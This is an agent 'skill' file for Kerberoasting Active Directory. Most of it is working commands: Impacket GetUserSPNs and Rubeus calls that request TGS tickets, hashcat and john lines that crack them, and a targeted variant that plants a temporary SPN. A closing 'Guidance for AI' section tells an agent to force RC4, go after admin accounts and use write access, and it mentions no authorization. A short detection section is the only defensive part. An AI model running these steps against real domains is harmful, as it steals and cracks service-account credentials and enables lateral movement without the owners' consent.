# Kerberoast Skill

## Goal

Extract and crack service account credentials via TGS ticket requests in Active Directory.

## Methodology

1. **Enumerate SPNs:** Find service accounts with ServicePrincipalName set
2. **Request TGS:** Request service tickets for target accounts
3. **Extract Hashes:** Export tickets in crackable format
4. **Crack Offline:** Use hashcat/john to crack passwords

## Key Points

- Targets TGS tickets for services running under user accounts (not computer accounts)
- Tickets encrypted with service account's password-derived key
- No elevated privileges required; any authenticated user can request TGS
- RC4 hashes crack ~1000x faster than AES

## Enumeration

### Windows

```powershell
# Built-in
setspn.exe -Q */*

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats
.\Rubeus.exe kerberoast /stats
```

### Linux

```bash
# Impacket
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
```

## Attack

### Linux

```bash
# Request and save roastable hashes
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast

# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER>

# Target specific user
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>
```

### Windows

```powershell
# Rubeus - default kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Target single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast

# Target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap

# Force RC4 for easier cracking
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
```

## Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat - RC4 (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt

# Hashcat - AES256 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

## Targeted Kerberoast

If you have GenericWrite/GenericAll over a user:

```powershell
# Add temporary SPN
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc'}

# Kerberoast the user
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap

# Remove SPN
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname
```

```bash
# Linux one-liner
targetedKerberoast.py -d '<DOMAIN>' -u <USER> -p '<PASS>'
```

## Detection

- Event ID 4769 (Kerberos service ticket requested)
- Look for RC4 requests (etype 0x17) in AES environments
- Baseline normal SPN usage; alert on bursts

## Tools

* **Rubeus** - Windows Kerberos toolkit
* **GetUserSPNs.py** - Impacket kerberoasting
* **hashcat** - Password cracking

## Guidance for AI

* Activate for Active Directory engagements
* Enumerate SPNs first to identify targets
* Prefer RC4 tickets for faster cracking
* Use /ldapfilter to target high-value accounts
* Consider targeted kerberoast if no SPNs but have write access
